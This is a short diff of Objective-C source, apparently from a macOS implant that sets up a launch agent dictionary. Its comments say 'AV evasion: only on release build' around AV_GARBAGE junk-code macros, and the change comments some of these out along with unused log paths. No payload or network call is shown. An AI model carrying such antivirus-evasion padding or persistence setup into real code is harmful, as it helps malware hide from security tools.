@@ -331,15 +331,15 @@ static __m_MUtils *sharedUtils = nil;
   // AV evasion: only on release build
   AV_GARBAGE_001
   
-  NSString *errorLog = [NSString stringWithFormat: @"/dev/null"];
+  //NSString *errorLog = [NSString stringWithFormat: @"/dev/null"]; // J: unused
   
   // AV evasion: only on release build
-  AV_GARBAGE_005
+  //AV_GARBAGE_005
   
-  NSString *outLog   = [NSString stringWithFormat: @"/dev/null"];
+  //NSString *outLog   = [NSString stringWithFormat: @"/dev/null"]; // J: unused
   
   // AV evasion: only on release build
-  AV_GARBAGE_003
+  //AV_GARBAGE_003
   
   innerDict = 
     [[NSDictionary alloc] initWithObjectsAndKeys:aLabel, @"Label",
